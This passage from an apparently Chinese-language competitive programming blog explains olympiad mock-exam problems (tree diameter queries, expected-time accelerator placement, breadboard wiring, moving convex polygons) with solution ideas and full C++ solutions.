begin(v),end(v) using namespace std; using ll = long long; const int maxn = 1000025; int color[maxn]; int nxt[maxn]; bool usedColor[50]; int curPos[50]; vector\u0026lt;int\u0026gt; ans; int dfs_call; bool dfs(int cs, int k) { ++dfs_call; if (k == 0) return true; int pos1 = maxn-1; for (int j = 0; j \u0026lt; cs; j++) { if (!usedColor[j]) { pos1 = min(pos1, curPos[j]); } } if (pos1 == maxn-1) return false; int color1 = color[pos1]; usedColor[color1] = true; int color2 = -1, color3 = -1; int pos2 = -1, pos3 = -1; for (int j = 0; j \u0026lt; cs; j++) if (!usedColor[j] \u0026amp;\u0026amp; curPos[j] == pos1 + 1) { assert (color2 == -1); color2 = j; pos2 = curPos[color2]; } if (color2 != -1) { curPos[color2] = nxt[curPos[color2]]; } if (dfs(cs, k-1)) { ans.push_back(pos1); return true; } if (color2 != -1) { curPos[color2] = pos2; } usedColor[color1] = false; if (color2 == -1) return false; usedColor[color2] = true; assert (color1 != color2 \u0026amp;\u0026amp; color2 != color3); // maybe color1 == color3 { curPos[color1] = nxt[curPos[color1]]; } for (int j = 0; j \u0026lt; cs; j++) if (!usedColor[j] \u0026amp;\u0026amp; curPos[j] == pos2 + 1) { assert (color3 == -1); color3 = j; pos3 = curPos[j]; } if (color3 != -1) { curPos[color3] = nxt[curPos[color3]]; } if (dfs(cs, k-1)) { ans.push_back(pos2); return true; } if (color3 != -1) { curPos[color3] = pos3; } { curPos[color1] = pos1; } usedColor[color2] = false; return false; } int mp[maxn]; void solve() { int n, k; cin \u0026gt;\u0026gt; n \u0026gt;\u0026gt; k; int tot = 0; for (int i = 0; i \u0026lt; n; i++) cin \u0026gt;\u0026gt; color[i]; for (int i = 1; i \u0026lt;= n; i++) mp[i] = -7122; for (int i = 0; i \u0026lt; n; i++) { if (tot \u0026lt; k * 2 \u0026amp;\u0026amp; mp[color[i]] == -7122) { mp[color[i]] = tot++; } } for (int j = 0; j \u0026lt; tot; j++) curPos[j] = maxn-1, usedColor[j] = false; nxt[maxn-1] = maxn-1; for (int i = n-1; i \u0026gt;= 0; i--) { if (mp[color[i]] \u0026gt;= 0) { int id = mp[color[i]]; nxt[i] = curPos[id]; curPos[id] = i; color[i] = id; } else { color[i] = -7122222; } } ans.clear(); if (dfs(tot, k)) { reverse(all(ans)); for (int i = 0; i \u0026lt; k; i++) cout \u0026lt;\u0026lt; ans[i]+1 \u0026lt;\u0026lt; (i+1==k ? \u0026#39;\\n\u0026#39; : \u0026#39; \u0026#39;); } else { cout \u0026lt;\u0026lt; 0 \u0026lt;\u0026lt; \u0026#39;\\n\u0026#39;; } } signed main() { ios_base::sync_with_stdio(0), cin.tie(0); int T; cin \u0026gt;\u0026gt; T; while (T--) solve(); debug(dfs_call); } p2 neko_atsume 題意 給定一棵 $n$ 點的樹，邊有邊權，並且有 m 個節點上有會參加宴會的貓咪 $x_1, x_2, \u0026hellip; x_m$。巧克力想要選一個節點舉辦宴會，使得「要參加宴會的貓咪與宴會地點的距離中最遠的」越短越好，請回答在選擇最好的節點的情況下這個距離是多少。\n此外還會有 $d$ 個修改 $p_i$，若 $p_i \u0026gt; 0$ 表示 $p_i$ 這個節點的貓咪可以前來宴會，若 $p_i \u0026lt; 0$ 表示 $|p_i|$ 這個節點的貓咪無法前來宴會，請在每次修改之後輸出前述的距離。\n當沒有貓咪參加宴會時請輸出 $0$。\n限制 $2 \\leq n \\leq 10^5$\n$0 \\leq m \\leq n$\n$1 \\leq x_i \\leq n$\n$0 \\leq d \\leq 2 \\times 10^5$\n$-n \\leq p_i \\leq n; p_i \\neq 0$\n樹的邊權介在 $[1, 1000]$ 之間\n保證 $p_i \u0026gt; 0$ 時，原本該節點的貓咪無法參加宴會，\n而 $p_i \u0026lt; 0$ 時原本該節點的貓咪可以參加宴會\nsubtask 1 (7) $n \\leq 100; d \\leq 100$\nsubtask 2 (12) 任意時間點參加的人數只有 $2$ 人（註：是 $\\leq 2$ 人）\nsubtask 3 (22) 每個時間點參加宴會的人數總和 $\\leq 4 \\times 10^6$\nsubtask 4 (24) $p_i \u0026gt; 0$\nsubtask 5 (35) 無額外限制\n作法 subtask 1 是水分。 subtask 2 是一個提示。可以二分搜說兩點中間距離「兩點距離 / 2」最近的點距離是多少，可能會用到跟 LCA 有關的資料結構。 接著講筆者在賽中想到的滿分解。考慮要參加的貓咪的那些頂點形成的虛樹（對於一個頂點集合 $V$ 來說，一條邊被包含在虛樹裡面若且唯若原本的樹拔掉這條邊之後會使得 $V$ 變成兩個連通塊），可以知道要舉辦宴會的那個點一定處在直徑這條路徑上，因此我們只要動態維護任意一條直徑的兩個端點之後，再用 subtask 2 的方法就可以 AC 了。 要如何動態維護直徑呢？考慮 subtask 4 ，如果只一直加入點的話，可以知道如果直徑變了，新的直徑一定是新加入的點跟原本其中一條直徑的一個端點構成的，因此可以透過查 $\\mathcal{O}(1)$ 次距離來動態維護直徑，再搭配時間線段樹的技巧就可以 AC 整題了。如果用 $\\mathcal{O}(1)$ 的 LCA （像是 ladder 或是 sparse table）的話，時間複雜度會是 $\\mathcal{O}(n\\log n + m\\log m + m\\log n)$。 答案會在直徑上的證明：\n首先假設有一條直徑的兩個端點分別是 $A,B$，那麼對於任何頂點 $P$ 來說，$A$ 或是 $B$ 至少其中之一會是距離他最遠的頂點（可能有其他頂點距離一樣遠），否則假設 $Q$ 是其中一個距離 $P$ 最遠的頂點，那麼\n$$\ndis(P, Q) \u0026gt; \\max(dis(P, B), dis(P, A))\n$$\n又 $AB$ 是直徑，所以\n$$\ndis(A,B) \\geq \\max(dis(A, Q), dis(B, Q))\n$$\n考慮下圖的兩種 case 都會產生矛盾，所以對於所有頂點 $P$ 來說，\n$\\max_{Q \\in V} dis(P, Q) = \\max(dis(P, A), dis(P, B))$。\n接著如果 $P$ 不在 $AB$ 路徑上的話，令 $AB$ 路徑上離 $P$ 最近的點 $P\u0026rsquo;$，$P\u0026rsquo;$ 的答案一定比 $P$ 更好，所以 $P$ 一定在 $AB$ 路徑上，而且距離 $P$ 最遠的點只需要考慮 $A,B$ 兩個點就好了。\n順帶一提筆者是用這題的技巧動態維護樹直徑的，現在看起來超級中毒XD\ncode 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 130 131 132 133 134 135 136 137 138 139 140 141 142 143 144 145 146 147 148 149 150 151 152 153 // An AC a day keeps the doctor away. #pragma GCC optimize(\u0026#34;Ofast\u0026#34;) #include \u0026lt;bits/stdc++.h\u0026gt; #ifdef local #define safe std::cerr\u0026lt;\u0026lt;__PRETTY_FUNCTION__\u0026lt;\u0026lt;\u0026#34; line \u0026#34;\u0026lt;\u0026lt;__LINE__\u0026lt;\u0026lt;\u0026#34; safe\\n\u0026#34; #define debug(args...) qqbx(#args, args) #define orange(args...) danb(#args, args) using std::cerr; template \u0026lt;typename ...T\u0026gt; void qqbx(const char *s, T ...args) { int cnt = sizeof...(T); ((cerr \u0026lt;\u0026lt; \u0026#34;\\e[1;32m(\u0026#34; \u0026lt;\u0026lt; s \u0026lt;\u0026lt; \u0026#34;) = (\u0026#34;), ..., (cerr \u0026lt;\u0026lt; args \u0026lt;\u0026lt; (--cnt ? \u0026#34;, \u0026#34; : \u0026#34;)\\e[0m\\n\u0026#34;))); } template \u0026lt;typename T\u0026gt; void danb(const char *s, T L, T R) { cerr \u0026lt;\u0026lt; \u0026#34;\\e[1;32m[ \u0026#34; \u0026lt;\u0026lt; s \u0026lt;\u0026lt; \u0026#34; ] = [ \u0026#34;; for (int f = 0; L != R; ++L) cerr \u0026lt;\u0026lt; (f++ ? \u0026#34;, \u0026#34; : \u0026#34;\u0026#34;) \u0026lt;\u0026lt; *L; cerr \u0026lt;\u0026lt; \u0026#34; ]\\e[0m\\n\u0026#34;; } #else #define safe ((void)0) #define debug(...) ((void)0) #define orange(...) ((void)0) #endif // local #define all(v) begin(v),end(v) using namespace std; using ll = long long; const int maxn = 100025; const int maxq = 200025; vector\u0026lt;pair\u0026lt;int,int\u0026gt;\u0026gt; g[maxn]; int wsum[maxn], pa[20][maxn], dep[maxn]; void dfs(int i, int f) { for (int L = 1; L \u0026lt; 20; L++) pa[L][i] = pa[L-1][pa[L-1][i]]; for (auto [w, j]: g[i]) { if (j == f) continue; dep[j] = dep[i] + 1; wsum[j] = wsum[i] + w; pa[0][j] = i; dfs(j, i); } } int lca(int a, int b) { if (dep[a] \u0026gt; dep[b]) swap(a, b); int d = dep[b] - dep[a]; for (int i = 0; i \u0026lt; 20; i++) if (d \u0026gt;\u0026gt; i \u0026amp; 1) b = pa[i][b]; if (a == b) return a; for (int i = 19; i \u0026gt;= 0; i--) if (pa[i][a] != pa[i][b]) a = pa[i][a], b = pa[i][b]; return pa[0][a]; } int dis(int a, int b) { return wsum[a] + wsum[b] - 2 * wsum[lca(a, b)]; } int solveTwoPoints(int a, int b, int d) { if (a == -1 || b == -1) return 0; int c = lca(a, b); if (wsum[a] - wsum[c] \u0026lt;= d / 2) swap(a, b); assert (wsum[a] - wsum[c] \u0026gt;= (d + 1) / 2); int x = a; for (int i = 19; i \u0026gt;= 0; i--) if (dep[x] - dep[c] \u0026gt;= (1 \u0026lt;\u0026lt; i) \u0026amp;\u0026amp; wsum[a] - wsum[pa[i][x]] \u0026lt;= d / 2) x = pa[i][x]; int ans = max(dis(a, x), dis(b, x)); if (x != c) ans = min(ans, max(dis(a, pa[0][x]), dis(b, pa[0][x]))); return ans; } struct Diameter { int a, b; int d; Diameter() : a(-1), b(-1), d(0) {} bool add(int x) { if (a == -1) return a = x, true; if (b == -1) return b = x, d = dis(a, b), true; if (int nd = dis(a, x); nd \u0026gt; d) return b = x, d = nd, true; if (int nd = dis(b, x); nd \u0026gt; d) return a = x, d = nd, true; return false; } }; struct Segtree { vector\u0026lt;int\u0026gt; event[maxq * 2]; int n; int ans[maxq]; void add(int l, int r, int e) { for (l += n, r += n; l \u0026lt; r; l \u0026gt;\u0026gt;= 1, r \u0026gt;\u0026gt;= 1) { if (l \u0026amp; 1) event[l++].push_back(e); if (r \u0026amp; 1) event[--r].push_back(e); } } void dfs(int i, Diameter d) { for (int x: event[i]) d.add(x); if (i \u0026lt; n) { dfs(i \u0026lt;\u0026lt; 1, d); dfs(i \u0026lt;\u0026lt; 1 | 1, d); } else { ans[i - n] = solveTwoPoints(d.a, d.b, d.d); } } } sgt; signed main() { ios_base::sync_with_stdio(0), cin.tie(0); int n, m; cin \u0026gt;\u0026gt; n \u0026gt;\u0026gt; m; for (int i = 1; i \u0026lt; n; i++) { int a, b, w; cin \u0026gt;\u0026gt; a \u0026gt;\u0026gt; b \u0026gt;\u0026gt; w; g[a].emplace_back(w, b); g[b].emplace_back(w, a); } dfs(1, 0); map\u0026lt;int,int\u0026gt; mp; for (int i = 0; i \u0026lt; m; i++) { int x; cin \u0026gt;\u0026gt; x; mp[x] = 0; } int q; cin \u0026gt;\u0026gt; q; sgt.n = q + 1; for (int i = 1; i \u0026lt;= q; i++) { int p; cin \u0026gt;\u0026gt; p; assert (p != 0); if (p \u0026gt; 0) { assert (!mp.count(p)); mp[p] = i; } else { assert (mp.count(p)); p = -p; sgt.add(mp[p], i, p); mp.erase(p); } } for (auto [p, t]: mp) sgt.add(t, q+1, p); sgt.dfs(1, Diameter()); for (int i = 0; i \u0026lt;= q; i++) cout \u0026lt;\u0026lt; sgt.ans[i] \u0026lt;\u0026lt; \u0026#39;\\n\u0026#39;; } p3 production 題意 給定一張 $n$ 點 $m$ 邊的有向圖，從頂點 $1$ 開始走，每個點有一個等待時間 $t_i$ ，到達一個頂點並等待完之後將會從該頂點的出邊中選一條走，而走每一條出邊的機率皆有給定（選擇某條出邊的機率是「該邊邊權 / 所有出邊的邊權」）。\n另外有 $k$ 個加速器，在頂點 $i$ 使用 $x$ 個加速器可以讓等待時間變成 $t_i / (1 + x)$，\n假設走邊的時間不計，你想求「從頂點 $1$ 開始走，走到沒有出邊的點所花的時間期望值」經過加裝一些加速器後最少是多少。\n限制 $1 \\leq n \\leq 10 ^ 5$\n$1 \\leq m \\leq 2 \\times 10 ^ 5$\n$1 \\leq k \\leq 10 ^ 5$\n$1 \\leq t_i \\leq 10 ^ 9$\n$1 \\leq $ 邊權 $ \\leq 10 ^ 6$\n保證可以從頂點 $1$ 抵達任何頂點、保證任何頂點都可以抵達其中一個終點\n輸出浮點數與正確答案相對誤差 $\\leq 10^{-6}$ 的答案視為正確\nsubtask 1 (9) $n \\leq 100; m = n-1; k \\leq 1000$\nsubtask 2 (49) $m = n-1$\nsubtask 3 (23) 保證圖是 DAG\nsubtask 4 (19) $n \\leq 100$\n作法 先考慮沒有加裝任何加速器的時候期望值是怎麼算的。\n定義 $X_i$ 是一個隨機變數代表「從頂點 $1$ 開始走，走到終點為止經過頂點 $i$ 的次數」\n那麼花費的總時間就是 $\\sum t_i X_i$，期望值 $E(\\sum t_i X_i) = \\sum E(t_i X_i) = \\sum t_i E(X_i)$，因為期望值可以拆開來，不管 $X_i$ 之間是否獨立。\n那麼要如何求出 $E(X_i)$ 呢？首先可以列出遞迴的式子：\n$$\nE(X_i) = [i = 1] + \\sum p_{j,i} E(X_j)\n$$\n其中 $[i=1]$ 是艾佛森括號，$p_{j,i}$ 代表現在在頂點 $j$ 的話走到頂點 $i$ 的機率\n仔細看 subtask 的話可以發現前三個 subtask 都是 DAG ，可以用 DP 的方式求出 $E(X_i)$，而最後一個 subtask 可能會有各種環出現，但是 $n$ 只有 100，可以用高斯消去的方法得到 $E(X_i)$（至於為什麼一定有解我不知道，可能跟「保證可以從頂點 $1$ 抵達任何頂點、保證任何頂點都可以抵達其中一個終點」有關）。\n接著是第二步，也就是如何加裝加速器。可以發現在同一個頂點裝加速器的效益是越來越低的，那麼有一個很直覺的貪心就是每次拿「能夠減少的時間」最多的頂點一直拿，因為如果不拿的話可以把最後一個裝的加速器直接換給那個頂點而使得最佳解至少不會變壞。\n因為 $k$ 只有 $10^5$ 所以甚至可以直接用 heap 或 multiset 維護最大一直拿就好了。如果 $k$ 到 $10^9$ 或更多的話可能可以用二分搜去算，類似今年入營考那題。\ncode 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 130 131 132 133 134 135 // An AC a day keeps the doctor away. #pragma GCC optimize(\u0026#34;Ofast\u0026#34;) #include \u0026lt;bits/stdc++.h\u0026gt; #ifdef local #define safe std::cerr\u0026lt;\u0026lt;__PRETTY_FUNCTION__\u0026lt;\u0026lt;\u0026#34; line \u0026#34;\u0026lt;\u0026lt;__LINE__\u0026lt;\u0026lt;\u0026#34; safe\\n\u0026#34; #define debug(args...) qqbx(#args, args) #define orange(args...) danb(#args, args) using std::cerr; template \u0026lt;typename ...T\u0026gt; void qqbx(const char *s, T ...args) { int cnt = sizeof...(T); ((cerr \u0026lt;\u0026lt; \u0026#34;\\e[1;32m(\u0026#34; \u0026lt;\u0026lt; s \u0026lt;\u0026lt; \u0026#34;) = (\u0026#34;), ..., (cerr \u0026lt;\u0026lt; args \u0026lt;\u0026lt; (--cnt ? \u0026#34;, \u0026#34; : \u0026#34;)\\e[0m\\n\u0026#34;))); } template \u0026lt;typename T\u0026gt; void danb(const char *s, T L, T R) { cerr \u0026lt;\u0026lt; \u0026#34;\\e[1;32m[ \u0026#34; \u0026lt;\u0026lt; s \u0026lt;\u0026lt; \u0026#34; ] = [ \u0026#34;; for (int f = 0; L != R; ++L) cerr \u0026lt;\u0026lt; (f++ ? \u0026#34;, \u0026#34; : \u0026#34;\u0026#34;) \u0026lt;\u0026lt; *L; cerr \u0026lt;\u0026lt; \u0026#34; ]\\e[0m\\n\u0026#34;; } #else #define safe ((void)0) #define debug(...) ((void)0) #define orange(...) ((void)0) #endif // local #define all(v) begin(v),end(v) using namespace std; using ld = long double; const int maxn = 100025; namespace gauss { const ld eps = 1e-10; ld A[105][105], b[105]; // Ax = b, solve x void elim(int n) { for (int k = 0; k \u0026lt; n; k++) { if (abs(A[k][k]) \u0026lt;= eps) { int p = -1; for (int i = k+1; i \u0026lt; n; i++) if (abs(A[i][k]) \u0026gt; eps) { p = i; break; } assert (p != -1); for (int j = 0; j \u0026lt; n; j++) swap(A[k][j], A[p][j]); swap(b[k], b[p]); } for (int i = 0; i \u0026lt; n; i++) if (i != k) { ld r = A[i][k] / A[k][k]; for (int j = 0; j \u0026lt; n; j++) A[i][j] -= A[k][j] * r; b[i] -= b[k] * r; } } for (int i = 0; i \u0026lt; n; i++) for (int j = 0; j \u0026lt; n; j++) if (i != j) assert (abs(A[i][j]) \u0026lt;= eps); for (int i = 0; i \u0026lt; n; i++) assert (abs(A[i][i]) \u0026gt; eps); for (int i = 0; i \u0026lt; n; i++) b[i] /= A[i][i]; } } int t[maxn]; int out[maxn]; vector\u0026lt;pair\u0026lt;int,int\u0026gt;\u0026gt; g[maxn]; int indeg[maxn]; ld E[maxn]; int rat[maxn]; signed main() { ios_base::sync_with_stdio(0), cin.tie(0); int n, m, k; cin \u0026gt;\u0026gt; n \u0026gt;\u0026gt; m \u0026gt;\u0026gt; k; for (int i = 0; i \u0026lt; n; i++) cin \u0026gt;\u0026gt; t[i]; for (int i = 0; i \u0026lt; m; i++) { int a, b, c; cin \u0026gt;\u0026gt; a \u0026gt;\u0026gt; b \u0026gt;\u0026gt; c; --a, --b; g[a].emplace_back(c, b); out[a] += c; indeg[b] += 1; } if (n \u0026gt; 100) { E[0] = 1; queue\u0026lt;int\u0026gt; que; for (int i = 0; i \u0026lt; n; i++) if (indeg[i] == 0) { que.push(i); } assert (que.size() == 1 \u0026amp;\u0026amp; que.front() == 0); while (!que.empty()) { int i = que.front(); que.pop(); for (auto [c, j]: g[i]) E[j] += E[i] * c / ld(out[i]); for (auto [c, j]: g[i]) if (--indeg[j] == 0) que.push(j); } for (int i = 0; i \u0026lt; n; i++) assert (indeg[i] == 0); } else { for (int i = 0; i \u0026lt; n; i++) gauss::A[i][i] = 1; for (int i = 0; i \u0026lt; n; i++) { // E[i] = [i=1] + \\sum p_{j,i} E[j] for (auto [c, j]: g[i]) { ld p = c / ld(out[i]); gauss::A[j][i] = -p; } } gauss::b[0] = 1; gauss::elim(n); for (int i = 0; i \u0026lt; n; i++) E[i] = gauss::b[i]; } for (int i = 0; i \u0026lt; n; i++) E[i] *= t[i]; priority_queue\u0026lt;pair\u0026lt;ld,int\u0026gt;\u0026gt; pq; for (int i = 0; i \u0026lt; n; i++) { rat[i] = 1; pq.emplace(E[i] / rat[i] - E[i] / (rat[i] + 1), i); } for (int t = 0; t \u0026lt; k; t++) { auto [_, i] = pq.top(); pq.pop(); rat[i] += 1; pq.emplace(E[i] / rat[i] - E[i] / (rat[i] + 1), i); } ld ans = 0; for (int i = 0; i \u0026lt; n; i++) ans += E[i] / rat[i]; cout \u0026lt;\u0026lt; fixed \u0026lt;\u0026lt; setprecision(10); cout \u0026lt;\u0026lt; ans \u0026lt;\u0026lt; \u0026#39;\\n\u0026#39;; } p4 breadboard 題意 有 $n$ 個元件與 $m$ 條導線需要被安置在麵包版上，並且希望同時符合下列兩個規則\n每個元件只能被放在 $(x, y)$ 的位置上，其中 $x$ 是正整數，$y$ 座標只能是 $1$ 或 $0$ 每條導線連接兩個元件 $(u, v)$，連接方式是從一個元件拉一條直線線段到另一個元件上。每條導線連接的元件需要放在不同的 $y$ 座標上，且任兩條導線不能有交叉，連到同一個元件的導線不視為交叉。 在滿足上述規則的同時，希望所有元件放置的 $x$ 座標都在 $k$ 以下，且 $k$ 越小越好。\n請輸出最小的 $k$ 值，若沒有一種滿足規則的方法請輸出 $-1$。\n限制 $1 \\leq n \\leq 10^5$\n$0 \\leq m \\leq 10^6$\n保證沒有兩條導線連接相同的兩個元件，並且每條導線的兩個端點是不同的元件。\nsubtask 1 (5) $n \\leq 20$\nsubtask 2 (10) $n \\leq 100$\nsubtask 3 (31) $n \\leq 10000$\nsubtask 4 (54) 無額外限制\n作法 其實看到題目給的附圖就會知道這題跟二分圖有關係了（？）\n首先把元件當成點、導線當成邊，那麼題目等於是給定一張圖要你判他是不是同時是二分圖又可以照規則畫出來。\n稍微畫幾個例子就可以知道，可以滿足規則的連通圖大概會是一條鏈加上一堆葉子。\n可以用幾個規則來判這件事：首先圖要是樹，接著每個 $\\deg \u0026gt; 1$ 的頂點只能有最多兩個鄰居也是 $\\deg \u0026gt; 1$ 的。\n另外，只要決定好哪些點要放上面哪些點要放下面的話，那麼最大的 $x$ 座標至少就是 $\\min($ 下面的點數 $,$ 上面的點數 $)$，並且也可以達成這樣的最小值。\n因此我們相當於每個連通塊有兩種放法，讓某個點在上面還是下面會造成上面或是下面增加一定的點數。可以用背包問題類型的 DP 來解決這樣類似 0/1 背包問題的部份，但是複雜度可能有點不太對，有兩個方法可以解決並 AC 本題：\n使用 bitset 加速。必須把 DP 的狀態改成「是否可以湊出來」。 因為連通塊點數總和是 $\\mathcal{O}(n)$ ，不同的數字種類最多只有 $\\mathcal{O}(\\sqrt{n})$，可以對每個數字做類似多重背包的東西。 code 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 // An AC a day keeps the doctor away. #pragma GCC optimize(\u0026#34;Ofast\u0026#34;) #include \u0026lt;bits/stdc++.h\u0026gt; #ifdef local #define safe std::cerr\u0026lt;\u0026lt;__PRETTY_FUNCTION__\u0026lt;\u0026lt;\u0026#34; line \u0026#34;\u0026lt;\u0026lt;__LINE__\u0026lt;\u0026lt;\u0026#34; safe\\n\u0026#34; #define debug(args...) qqbx(#args, args) #define orange(args...) danb(#args, args) using std::cerr; template \u0026lt;typename ...T\u0026gt; void qqbx(const char *s, T ...args) { int cnt = sizeof...(T); ((cerr \u0026lt;\u0026lt; \u0026#34;\\e[1;32m(\u0026#34; \u0026lt;\u0026lt; s \u0026lt;\u0026lt; \u0026#34;) = (\u0026#34;), ..., (cerr \u0026lt;\u0026lt; args \u0026lt;\u0026lt; (--cnt ? \u0026#34;, \u0026#34; : \u0026#34;)\\e[0m\\n\u0026#34;))); } template \u0026lt;typename T\u0026gt; void danb(const char *s, T L, T R) { cerr \u0026lt;\u0026lt; \u0026#34;\\e[1;32m[ \u0026#34; \u0026lt;\u0026lt; s \u0026lt;\u0026lt; \u0026#34; ] = [ \u0026#34;; for (int f = 0; L != R; ++L) cerr \u0026lt;\u0026lt; (f++ ? \u0026#34;, \u0026#34; : \u0026#34;\u0026#34;) \u0026lt;\u0026lt; *L; cerr \u0026lt;\u0026lt; \u0026#34; ]\\e[0m\\n\u0026#34;; } #else #define safe ((void)0) #define debug(...) ((void)0) #define orange(...) ((void)0) #endif // local #define all(v) begin(v),end(v) using namespace std; using ld = long double; const int maxn = 100025; bool vis[maxn]; vector\u0026lt;int\u0026gt; g[maxn]; bool color[maxn]; int cnt[2]; bitset\u0026lt;maxn\u0026gt; dp; void dfs(int i, int f = -1) { ++cnt[color[i]]; vis[i] = true; for (int j: g[i]) if (!vis[j]) { color[j] = !color[i]; dfs(j, i); } else if (j != f) { // cycle = true; cout \u0026lt;\u0026lt; -1 \u0026lt;\u0026lt; \u0026#39;\\n\u0026#39;; exit(0); } } signed main() { ios_base::sync_with_stdio(0), cin.tie(0); int n, m; cin \u0026gt;\u0026gt; n \u0026gt;\u0026gt; m; for (int i = 0; i \u0026lt; m; i++) { int a, b; cin \u0026gt;\u0026gt; a \u0026gt;\u0026gt; b; --a, --b; g[a].push_back(b); g[b].push_back(a); } int sum = 0; vector\u0026lt;int\u0026gt; diff; for (int i = 0; i \u0026lt; n; i++) if (!vis[i]) { cnt[0] = cnt[1] = 0; dfs(i); sum += abs(cnt[0] - cnt[1]); diff.push_back(abs(cnt[0] - cnt[1])); } for (int i = 0; i \u0026lt; n; i++) if (g[i].size() \u0026gt; 1) { int c = 0; for (int j: g[i]) if (g[j].size() \u0026gt; 1) ++c; if (c \u0026gt; 2) { cout \u0026lt;\u0026lt; -1 \u0026lt;\u0026lt; \u0026#39;\\n\u0026#39;; exit(0); } } dp[0] = true; for (int x: diff) dp |= dp \u0026lt;\u0026lt; x; // dp[X] = we can make one side X int ans = n; for (int i = 0; i \u0026lt; maxn; i++) if (dp[i]) { // |a-b| = |i - (sum-i)| int d = abs(sum - i * 2); // a + b = n assert (d % 2 == n % 2); ans = min(ans, (n + d) / 2); } cout \u0026lt;\u0026lt; ans \u0026lt;\u0026lt; \u0026#39;\\n\u0026#39;; } 四模 註：四模打完沒有開放judge讓我們練習的時間，所以code跟賽中沒有人AC的cards不保證正確。\np1 spotlight 題意 給定 $n$ 個（實心的）凸多邊形，每個多邊形有一個固定的移動速度 $(dx, dy)$，整個多邊形會沿著該方向不停的等速移動。\n對於第 $i$ 個多邊形，請輸出這個多邊形有碰到其他多邊形的總時間，若永遠都會碰到輸出 infinity，否則輸出的相對誤差或絕對誤差在 1e-6 以下都算正確。碰到多邊形的定義是兩者的交集非空，只有邊界或是頂點碰到也算。\n限制 $2 \\leq n \\leq 100$\n每個凸多邊形的點數 $\\leq 100$\n頂點座標的絕對值 $\\leq 10000$\n保證輸入給的頂點不會在凸多邊形邊上\nsubtask 1 (15) 保證輸入給的是平行座標軸的長方形\nsubtask 2 (11) 所有 $dx = dy = 0$\nsubtask 3 (17) 對於每個多邊形皆有 $dx = 0$ 或 $dy = 0$ （註：不太確定實際意思）\nsubtask 4 (57) 無額外限制\n作法 subtask 2 $dx=dy=0$\n多邊形不會動，表示答案只有0或是infinity，只要檢查多邊形兩兩之間有沒有碰到就可以了。\n判斷凸多邊形兩兩有沒有交集可以用下面兩個條件來判斷，只要其中一個條件成立就一定有相交，而都不成立就表示沒有相交。\n1. 兩個多邊形的邊是否有相交\n2. 是否有一個多邊形的頂點坐落在另一個多邊形的裡面\n雖然只判斷第2點會在賽中得到這個subtask的分數，但是注意只判其中一個條件都有反例。 滿分解\n不太確定其他subtask是拿來幹嘛的，完全沒有特別簡單的寫法。\n記第$i$個多邊形為$P_i$，他的速度是$\\vec{v_i} = (dx_i, dy_i)$\n考慮枚舉所有多邊形對$(i,j)$，$P_j$對$P_i$的相對速度是$\\vec{v_j}-\\vec{v_i}$。可以知道兩個多邊形可能完全不會碰到、永遠碰在一起，或是碰到一段時間$[s,t]$。先假設相對速度非零，考慮把座標旋轉、伸縮使得相對速度變成$(0,-1)$，也就是沿著Y軸方向下落。任何一條通過兩個多邊形的鉛直線和兩個多邊形的交集分別會是一段線段，可以推出他們在這個X座標互相碰到與離開的時間。取遍所有這類鉛直線，再把有碰到的時間區間聯集起來就是這兩個多邊形互相碰觸的時間區間，但我們不可能算那麼多條線，不過透過觀察可以發現，只要取遍所有頂點的X座標，再計算在那些X座標的碰觸時間的最小值與最大值，所得到正好是我們要的時間區間。\n枚舉所有多邊形對並計算兩兩之間有碰到的時間，可以用爬行法作到$\\mathcal{O}(n\\sum |P_i|)$，其中$|P_i|$是多邊形$P_i$的點數，不過筆者賽中是寫$\\mathcal{O}((\\sum |P_i|)^2)$有AC。 code 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 130 131 132 133 134 135 136 137 138 139 140 141 142 143 144 145 146 #pragma GCC optimize(\u0026#34;Ofast\u0026#34;) #include \u0026lt;bits/stdc++.h\u0026gt; #ifdef local #define safe cerr\u0026lt;\u0026lt;__PRETTY_FUNCTION__\u0026lt;\u0026lt;\u0026#34; line \u0026#34;\u0026lt;\u0026lt;__LINE__\u0026lt;\u0026lt;\u0026#34; safe\\n\u0026#34; #define pary(a...) danb(#a, a) #define debug(a...) qqbx(#a, a) template \u0026lt;typename ...T\u0026gt; void qqbx(const char *s, T ...a) { int cnt = sizeof...(T); ((std::cerr \u0026lt;\u0026lt; \u0026#34;\\033[1;32m(\u0026#34; \u0026lt;\u0026lt; s \u0026lt;\u0026lt; \u0026#34;) = (\u0026#34;) , ... , (std::cerr \u0026lt;\u0026lt; a \u0026lt;\u0026lt; (--cnt ? \u0026#34;, \u0026#34; : \u0026#34;)\\033[0m\\n\u0026#34;))); } template \u0026lt;typename T\u0026gt; void danb(const char *s, T L, T R) { std::cerr \u0026lt;\u0026lt; \u0026#34;\\033[1;32m[ \u0026#34; \u0026lt;\u0026lt; s \u0026lt;\u0026lt; \u0026#34; ] 